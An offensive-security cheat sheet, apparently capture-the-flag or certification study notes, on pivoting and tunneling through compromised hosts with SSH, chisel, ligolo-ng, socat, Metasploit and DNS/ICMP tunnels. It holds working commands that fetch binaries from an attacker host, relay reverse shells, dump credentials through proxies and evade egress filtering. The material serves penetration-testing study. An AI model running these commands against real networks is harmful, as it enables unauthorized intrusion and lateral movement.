# Pivoting, Tunneling & Port Forwarding

## Table of Contents
- [Core Concepts](#core-concepts)
- [Decision Table](#decision-table)
- [SSH Forwarding](#ssh-forwarding)
- [proxychains / proxychains-ng](#proxychains--proxychains-ng)
- [chisel](#chisel)
- [ligolo-ng](#ligolo-ng)
- [Metasploit Pivoting](#metasploit-pivoting)
- [Windows Native (netsh portproxy)](#windows-native-netsh-portproxy)
- [socat](#socat)
- [Other Tools (rpivot, DNS, ICMP)](#other-tools-rpivot-dns-icmp)
- [Practical: Scanning, Reverse Shells, Hosts, MTU](#practical-scanning-reverse-shells-hosts-mtu)

For AD-specific lateral movement (PsExec/WMI/PtH) see ctf-ad/lateral-movement.md. For Kerberos through a proxy see ctf-ad/kerberos.md.

---

## Core Concepts

**Local forward (`-L`)** — open a port on *your* box that tunnels to a host:port reachable *from the pivot*. Pull a remote service to you. `attacker:LPORT -> pivot -> target:RPORT`.

**Remote forward (`-R`)** — open a port on the *pivot/remote* box that tunnels back to a host:port reachable *from you*. Push a service (or a listener) the other way. Use when you cannot reach the pivot inbound but it can reach you (reverse). Also used to reach *your* box from deep inside.

**Dynamic forward (`-D`)** — open a SOCKS proxy on your box. Any TCP (and DNS with socks5) to *any* host:port reachable from the pivot, decided per-connection by the client via proxychains. One tunnel, whole subnet.

**Port-forward vs SOCKS proxy:** a port-forward is a *fixed* 1:1 mapping (one local port -> one remote host:port). A SOCKS proxy is *dynamic* — the proxied app names the destination at connect time, so you reach an entire network through a single listener. Prefer SOCKS for enumeration/lateral movement; use fixed forwards for a single known service (e.g. RDP, one web app) or for tools that refuse to be proxied.

**Single vs double pivot:** single pivot = attacker -> P1 -> target-net. Double pivot = attacker -> P1 -> P2 -> deeper-net, where P2 is only reachable from P1. Each hop needs its own forward/agent; chain them.

**SOCKS4 vs SOCKS5:** SOCKS4 has no auth and cannot carry DNS (client must supply an IP). SOCKS5 supports auth and remote DNS resolution (`socks5` in proxychains resolves names on the far side — critical for AD FQDNs). SSH `-D` speaks SOCKS4 and SOCKS5. Use socks5 when you need name resolution through the tunnel.

---

## Decision Table

| Access on pivot host | Use |
|---|---|
| SSH creds/key, *nix pivot | `ssh -D` (SOCKS) or `-L`/`-R`; `sshuttle` if you want whole-subnet routing without proxychains |
| SSH creds, Windows attacker | `plink.exe -R` / `-L`, or ligolo/chisel |
| Shell only (no SSH), can drop a binary | ligolo-ng (best) or chisel; both do reverse SOCKS |
| Meterpreter session | `run autoroute` + `socks_proxy` module, or `portfwd` |
| Windows target, admin, no binary allowed | `netsh interface portproxy` (LOLBIN) |
| Only outbound to attacker allowed (ingress filtered) | reverse tunnel: chisel `R:socks`, ligolo `agent -connect`, ssh `-R` |
| Only DNS egress | dnscat2 / iodine |
| Only ICMP egress | ptunnel-ng |
| Need one fixed service relayed | socat / netsh / ssh `-L` |
| Whole VPN-like L3 access to internal subnet | ligolo-ng (tun) or sshuttle |

---

## SSH Forwarding

Assume attacker = you, `PIVOT` = compromised host you have SSH to, `TARGET`/`10.10.10.5` = only reachable from PIVOT.

**Local forward** — pull `TARGET:445` to your `127.0.0.1:4455`:
```bash
ssh -L 4455:10.10.10.5:445 user@PIVOT
# now: smbclient -L //127.0.0.1 -p 4455
```

**Dynamic (SOCKS) forward** — SOCKS proxy on your `127.0.0.1:1080` reaching everything PIVOT can:
```bash
ssh -D 1080 user@PIVOT
# with proxychains (socks5 127.0.0.1 1080): proxychains nmap -sT -Pn 10.10.10.5
```

**Remote forward** — expose your `127.0.0.1:8000` to PIVOT as `PIVOT:8000` (e.g. serve a payload inward), or bring a deep port back to you:
```bash
# expose attacker:8000 on the pivot
ssh -R 8000:127.0.0.1:8000 user@PIVOT
# reverse SOCKS: run FROM the pivot, dialing back to your sshd; SOCKS opens on ATTACKER 1080, exits from PIVOT's network
ssh -R 1080 user@ATTACKER    # OpenSSH 7.6+ remote dynamic forward; -R <port> with no dest = SOCKS on the server (attacker) side
```

**Backgrounded, no shell:**
```bash
ssh -f -N -D 1080 user@PIVOT   # -f fork to bg after auth, -N no remote command
```

**Gateway ports** — bind forwards to `0.0.0.0` instead of loopback so other hosts can use them:
```bash
ssh -R 0.0.0.0:8000:127.0.0.1:80 user@PIVOT       # needs GatewayPorts yes on PIVOT sshd
ssh -g -L 0.0.0.0:4455:10.10.10.5:445 user@PIVOT  # -g on the local side
```

**ProxyJump (`-J`)** — chain hops without manual nested forwards. attacker -> P1 -> P2:
```bash
ssh -J user@P1 user@P2
ssh -J user1@P1:22,user2@P2:22 user3@P3        # triple
# equivalent old form: -o ProxyCommand="ssh -W %h:%p user@P1"
```

**SSH config file** (`~/.ssh/config`) — reusable chain:
```
Host p1
    HostName 10.0.0.10
    User user
    IdentityFile ~/.ssh/id_p1
Host p2
    HostName 172.16.5.20
    User svc
    ProxyJump p1
    DynamicForward 1080
# then: ssh p2   -> gives SOCKS on 1080 exiting from p2's network
```

**plink.exe (Windows pivot/attacker)** — PuTTY's CLI, useful when you have a Windows shell and SSH out to your Linux attacker box:
```cmd
REM reverse forward: expose Windows target's 3389 on attacker:3389
plink.exe -ssh -R 3389:127.0.0.1:3389 attacker@ATTACKER_IP -pw PASS -N
REM accept host key non-interactively (careful):
cmd.exe /c echo y | plink.exe -ssh -R 1080 user@ATTACKER_IP -pw PASS
```

**sshuttle** — turns SSH into a poor-man's VPN. Transparently routes given subnets over SSH (iptables/nat on your box), no proxychains, works for tools that hate SOCKS. Beats `-D` when you need many tools, ICMP-less full-subnet TCP, or DNS. Requires Python on PIVOT.
```bash
sshuttle -r user@PIVOT 10.10.10.0/24 172.16.5.0/24
sshuttle -r user@PIVOT 0/0 --dns          # route everything + DNS
sshuttle -r user@PIVOT --ssh-cmd "ssh -i key.pem" 10.10.10.0/24
```
sshuttle is TCP+DNS only (no UDP/ICMP), so `nmap -sT` works but `-sU`/ping does not.

**Concrete SSH double pivot** — attacker can reach P1 (`10.10.10.10`); P1 can reach P2 (`172.16.5.20`); P2 can reach `192.168.50.0/24`:
```bash
# Hop 1: SOCKS to P1's network AND a local forward to P2's SSH
ssh -D 1080 -L 2222:172.16.5.20:22 user@10.10.10.10 -f -N
# Hop 2: SSH to P2 through that local forward, opening a second SOCKS on 1081
ssh -D 1081 -p 2222 svc@127.0.0.1 -f -N
# proxychains -> 127.0.0.1:1081 now exits inside 192.168.50.0/24
# Cleaner with ProxyJump (single command, one SOCKS at the far end):
ssh -J user@10.10.10.10 -D 1080 svc@172.16.5.20 -f -N
```

---

## proxychains / proxychains-ng

Forces TCP connections of any dynamically-linked program through a proxy chain. Config: `/etc/proxychains4.conf` (proxychains-ng) or `/etc/proxychains.conf`.

```conf
# /etc/proxychains4.conf
strict_chain          # use every proxy in order; fail if any is down
# dynamic_chain       # skip dead proxies (use for multi-proxy chains)
# random_chain        # random order

proxy_dns             # resolve DNS through the chain (needs socks5)
remote_dns_subnet 224 # fake A records handed to the app for proxied DNS

tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# type  host      port   [user pass]
socks5  127.0.0.1 1080
# double pivot: list hops in order with dynamic_chain
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

**strict vs dynamic:** `strict_chain` requires *all* listed proxies alive and connects through them in order — use for a deliberate multi-hop chain. `dynamic_chain` skips unreachable entries — safer when some proxies may be down but you still want the reachable path. Never leave both uncommented (last wins).

**Usage:**
```bash
proxychains nmap -sT -Pn -n 10.10.10.5              # MUST be -sT (TCP connect); SYN/UDP won't traverse SOCKS
proxychains -q crackmapexec smb 172.16.5.0/24       # -q quiet
proxychains nxc smb 172.16.5.20 -u user -p pass
proxychains evil-winrm -i 172.16.5.20 -u user -p pass
proxychains impacket-secretsdump domain/user:pass@172.16.5.20
proxychains impacket-psexec domain/user:pass@172.16.5.20
proxychains xfreerdp /v:172.16.5.20 /u:user /p:pass
```

**Pitfalls:**
- Only wraps TCP `connect()`. No ICMP (`-sn`/ping fails), no raw SYN (`-sS`), no UDP. Always `nmap -sT -Pn`.
- Use `socks5` + `proxy_dns` for AD FQDNs; `socks4` cannot resolve names, so pass IPs only.
- Statically-linked/Go binaries may ignore proxychains' LD_PRELOAD — use the tool's native proxy flag or ligolo/sshuttle instead.
- `-Pn` mandatory (host-discovery pings die in the tunnel).

---

## chisel

Fast TCP/UDP tunnel over HTTP/WebSocket, single Go binary. Great when you only have a reverse channel. Server and client versions must match. Get it onto the target (see transfer below).

**Reverse SOCKS (most common)** — server on ATTACKER, client on TARGET dials back and creates a SOCKS proxy on the attacker. Use when target's inbound is filtered but it can reach you.
```bash
# ATTACKER (listen, allow reverse tunnels)
./chisel server -p 8080 --reverse
# TARGET (dial back, R:socks = reverse SOCKS5 on server's 1080)
./chisel client ATTACKER_IP:8080 R:socks
# ATTACKER now has SOCKS5 on 127.0.0.1:1080 -> proxychains (socks5 127.0.0.1 1080)
```
`R:socks` defaults to server-side port 1080. To pin it: `R:1080:socks`.

**Reverse single port forward** — bring TARGET-reachable `10.10.10.5:445` back to attacker `127.0.0.1:4455`:
```bash
# ATTACKER
./chisel server -p 8080 --reverse
# TARGET
./chisel client ATTACKER_IP:8080 R:4455:10.10.10.5:445
```

**Forward SOCKS/forward port** — client on ATTACKER, server on the reachable PIVOT (needs inbound to pivot open):
```bash
# PIVOT (target)
./chisel server -p 8080 --socks5
# ATTACKER (bind local 1080 -> pivot's SOCKS)
./chisel client PIVOT_IP:8080 1080:socks
# forward a single port instead:
./chisel client PIVOT_IP:8080 4455:10.10.10.5:445
```

**Reverse forward to reach ATTACKER from inside** — expose attacker's `127.0.0.1:80` on target as `target:80`:
```bash
# ATTACKER: chisel server -p 8080 --reverse
# TARGET:   chisel client ATTACKER_IP:8080 R:80:127.0.0.1:80
```

**Auth / stealth:**
```bash
./chisel server -p 8080 --reverse --auth user:pass
./chisel client --auth user:pass ATTACKER_IP:8080 R:socks
```

**Transferring the binary:**
```bash
# Linux target
wget http://ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# Windows target (PowerShell)
iwr http://ATTACKER_IP/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
# grab release binaries: github.com/jpillora/chisel/releases ; strip+upx to shrink
```

---

## ligolo-ng

Modern agent/proxy tunnel using a **tun interface** — you route the target subnet through it like a VPN, so tools run natively (no proxychains, real DNS, works with nmap SYN). Current CPTS/CRTE favorite. Two binaries: `proxy` (attacker) and `agent` (target).

**One-time attacker setup (tun interface):**
```bash
# older versions require creating the interface manually:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
# newer ligolo auto-creates the interface on session start; skip the above if so.
```

**Start proxy (attacker), reverse listener with self-signed TLS:**
```bash
./proxy -selfcert -laddr 0.0.0.0:11601
# TLS cert warnings are expected with -selfcert
```

**Agent (target) dials back:**
```bash
# Linux
./agent -connect ATTACKER_IP:11601 -ignore-cert
# Windows
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

**In the proxy console — pick the session and route the subnet:**
```
ligolo-ng » session
[Agent : user@TARGET]  (select the number)
ligolo-ng » ifconfig          # read the agent's networks to learn the subnet
# in ANOTHER terminal, add a route for the internal subnet via the ligolo tun:
sudo ip route add 172.16.5.0/24 dev ligolo
# back in console, start the tunnel for the selected session:
ligolo-ng » start
# now run tools natively:  nmap 172.16.5.0/24 ; evil-winrm -i 172.16.5.20 ...
```

**Reverse shells / listeners back through the tunnel** — ligolo can forward a port on the *agent* (or on the tun) back to your attacker box so a callback from deep inside reaches your handler:
```
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# a shell on the internal host connecting to AGENT_IP:4444 is relayed to attacker 127.0.0.1:4444
ligolo-ng » listener_list
```
So the internal victim connects to the agent's IP:4444; you catch it locally on 4444. This solves the double-pivot listener-placement problem cleanly.

**Double pivot with ligolo** — agent1 on P1 (reaches P2's net), agent2 on P2 (reaches deep net):
```
# 1) Get agent1 back to proxy, route P1's internal subnet, start.
sudo ip route add 172.16.5.0/24 dev ligolo
ligolo-ng » start            # (agent1 session selected)

# 2) To reach P2's callback, add a listener on agent1 that relays P2's agent to your proxy:
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
#    (agent1 session selected) -> P2 can now "connect" to P1:11601 which tunnels to attacker:11601

# 3) On P2, run agent2 pointing at P1 (agent1's IP), not the attacker:
./agent -connect 172.16.5.10:11601 -ignore-cert

# 4) In proxy: new session appears (agent2). Select it, add a SECOND tun + route for the deep subnet:
sudo ip tuntap add user $(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up
sudo ip route add 192.168.50.0/24 dev ligolo2
ligolo-ng » session   # select agent2
ligolo-ng » start --tun ligolo2
```
Use a separate tun interface per agent when routing overlapping/adjacent subnets so routes stay unambiguous.

---

## Metasploit Pivoting

Kept brief — use when you already hold a Meterpreter session.

```
# add a route to the target subnet through session 1
meterpreter > run autoroute -s 172.16.5.0/24
# or from msf console:
msf > use post/multi/manage/autoroute
msf > set SESSION 1
msf > set SUBNET 172.16.5.0/24
msf > run

# stand up a SOCKS proxy that honours msf routes -> proxychains uses it
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > set VERSION 5
msf > run
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080

# single fixed forward via the session (no routing table needed)
meterpreter > portfwd add -l 4455 -p 445 -r 10.10.10.5   # local 4455 -> remote 445
meterpreter > portfwd add -R -l 4444 -p 4444 -L ATTACKER_IP  # reverse
meterpreter > portfwd list
```

---

## Windows Native (netsh portproxy)

No binary drop needed — built into Windows. Requires local admin. Prefer it when AV blocks tunneling tools or you only need a single relay through a Windows host. IPv4-to-IPv4 relay on the pivot:

```cmd
REM listen on PIVOT:3340, forward to internal 10.10.10.5:3389
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.5

REM open the inbound port through Windows Firewall
netsh advfirewall firewall add rule name="fwd3340" dir=in action=allow protocol=TCP localport=3340

REM verify / list
netsh interface portproxy show v4tov4
netsh interface portproxy show all

REM cleanup
netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=0.0.0.0
netsh advfirewall firewall delete rule name="fwd3340"
```
Requires the `iphlpsvc` (IP Helper) service running. portproxy is TCP-only and a fixed 1:1 map — not a SOCKS proxy; chain multiple rules for multiple services.

---

## socat

Universal relay. Good for a quick fixed port-forward, reverse relay, or to bounce a reverse shell through a middle host.

```bash
# simple TCP port forward on a pivot: PIVOT:8080 -> 10.10.10.5:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.5:80

# relay a reverse shell: victim connects to PIVOT:443, socat forwards to ATTACKER:443
socat TCP-LISTEN:443,fork,reuseaddr TCP:ATTACKER_IP:443

# encrypted relay (openssl) both ends
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork TCP:127.0.0.1:8080
socat - OPENSSL:PIVOT_IP:443,verify=0

# UDP forward
socat UDP-LISTEN:53,fork UDP:10.10.10.5:53

# bind shell -> connect shell relay (turn a bind shell into a reverse to you)
socat TCP-LISTEN:9001,fork TCP:VICTIM_IP:9002
```

---

## Other Tools (rpivot, DNS, ICMP)

Use these when normal TCP egress is heavily filtered.

**rpivot** — reverse SOCKS4 over a single connection, pure Python 2, no binary needed on target. Useful in restricted/no-Go environments.
```bash
# ATTACKER
python2 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
# TARGET (dial back)
python2 client.py --server-ip ATTACKER_IP --server-port 9999
# through a corp HTTP proxy:
python2 client.py --server-ip ATTACKER_IP --server-port 9999 --ntlm-proxy-host PROXY --ntlm-proxy-port 8080
# proxychains -> socks4 127.0.0.1 1080  (SOCKS4 only: no remote DNS)
```

**dnscat2 — DNS tunneling** — when only DNS leaves the network (all TCP egress blocked but the host resolves names). Needs an authoritative NS delegation for your domain.
```bash
# ATTACKER (server), listens on UDP/53 for your domain
ruby dnscat2.rb tunnel.attacker.com
# TARGET (client)
./dnscat tunnel.attacker.com
# direct mode (no delegation, point straight at your IP):
./dnscat --dns server=ATTACKER_IP,port=53 --secret=<secret>
# in the dnscat2 server console: window -i 1 ; then `listen 127.0.0.1:1080 <target:port>` to forward
```

**iodine — IP-over-DNS** — full tunnel interface over DNS; higher throughput than dnscat2, gives you a routable tun.
```bash
# ATTACKER (server): assign tunnel subnet + your delegated domain
sudo iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# TARGET (client)
sudo iodine -f -P password tunnel.attacker.com
# then route/ssh over the 10.0.0.0/24 tun interface it creates
```

**ptunnel-ng — ICMP tunneling** — when only ICMP echo escapes. Tunnels TCP inside ping packets.
```bash
# ATTACKER (proxy node, must be internet-reachable by target's ICMP)
sudo ptunnel-ng -r ATTACKER_IP -R22 -x password
# TARGET (client): local 2222 -> tunneled via ICMP -> ATTACKER's 22
sudo ptunnel-ng -p ATTACKER_IP -l2222 -r127.0.0.1 -R22 -x password
# then: ssh -p 2222 user@127.0.0.1
```

---

## Practical: Scanning, Reverse Shells, Hosts, MTU

**Scanning through a SOCKS proxy:**
```bash
# proxychains + nmap: TCP connect only, no ping, no DNS from nmap
proxychains nmap -sT -Pn -n -p 21,22,80,139,445,3389 10.10.10.5
# faster host sweep for live hosts (top ports), then focus:
proxychains nmap -sT -Pn -n --top-ports 20 10.10.10.0/24
# ligolo/sshuttle route the subnet at L3, so native nmap works (even -sS with sshuttle? no -> use -sT):
nmap -Pn 172.16.5.0/24            # over a ligolo tun, SYN scan works
# lightweight proxy-agnostic port check:
proxychains nc -zv 10.10.10.5 445
```

**Reverse shell back through a double pivot (listener-placement problem):** a shell spawned on the *deepest* host cannot reach your attacker box directly — it can only reach hosts on its own segment. Put the listener where the victim can reach it, then relay inward:
```
Attacker  <---  P1  <---  P2  <---  DEEP victim
```
- ligolo: `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp` on the agent nearest the victim; victim connects to that agent's IP:4444, you catch it on your local 4444.
- chisel: on the near pivot run a reverse forward `R:4444:127.0.0.1:4444` so the pivot's :4444 tunnels to your :4444; point the payload at the pivot IP.
- ssh: `ssh -R 4444:127.0.0.1:4444 user@P2` exposes your handler on P2; the victim connects to P2:4444.
- Always set the payload's LHOST to the *hop the victim can see*, not your real attacker IP.

**/etc/hosts for AD names through a tunnel** — Kerberos and many AD tools need FQDNs; add the DC/hosts so names resolve to their internal IPs (or the tun-routed IPs):
```bash
# /etc/hosts on attacker
172.16.5.5   dc01.corp.local corp.local
172.16.5.20  srv01.corp.local
# with proxychains use socks5 + proxy_dns so unlisted names still resolve via the DC.
# Kerberos: also set /etc/krb5.conf realm + KDC to the DC FQDN, and sync clock (ntpdate DC) before asking for tickets.
```

**MTU / fragmentation gotchas:**
- Tunnels add headers (SSH/WebSocket/tun) so the effective MTU shrinks. Large payloads fragment or silently stall — TLS handshakes and SMB transfers hang while a ping succeeds.
- On a ligolo/iodine/openvpn tun interface, lower the MTU: `sudo ip link set ligolo mtu 1350` (drop until big transfers stop hanging).
- nmap through slow/fragmenting tunnels: add `--max-retries 2 --host-timeout 60s` and reduce parallelism (`--min-rate` off, small `-p` lists) — SOCKS chains are latency-heavy.
- If SSH port-forwarded traffic stalls on bulk data but interactive works, suspect MTU/path-MTU-discovery blackholing; test with `ping -M do -s 1400 TARGET` and reduce.
- DNS/ICMP tunnels are inherently tiny-MTU and slow; expect kbps — use them only for a foothold shell or to bootstrap a better tunnel, not for scanning.
